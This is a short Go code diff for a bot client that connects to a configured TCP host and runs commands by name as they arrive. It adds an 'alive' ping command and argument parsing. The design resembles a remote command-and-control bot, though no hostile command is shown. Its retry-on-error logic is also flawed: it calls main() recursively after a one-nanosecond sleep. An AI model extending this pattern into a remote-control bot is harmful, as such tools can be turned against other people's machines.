@@ -10,6 +10,16 @@ import (
 
 func (bot *Bot) Start() {
 
+	bot.CmdList.Commands = append(bot.CmdList.Commands, &Command {
+		Names: []string{ "alive" },
+		Values:	[]string{ },
+		function: func(conn net.Conn, _ []string) {
+			fmt.Println("Alive")
+			conn.Write([]byte("Alive"))
+		},
+	})
+
+
 	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", bot.Host, bot.Port))
 	if err != nil { fmt.Println(err); time.Sleep(1); main() }
 
@@ -28,8 +38,13 @@ func (bot *Bot) Start() {
 
 		for _, cmd := range bot.CmdList.Commands {
 			for _, name := range cmd.Names {
-				if line == name {
-					cmd.function(conn)
+				command := strings.Split(line, " ")[0]
+				args := strings.Split(line, " ")[1:]
+
+				_ = fmt.Sprintf("%s -> %s", command, args[0:])
+
+				if command == name {
+					cmd.function(conn, args)
 				}
 			}
 		}
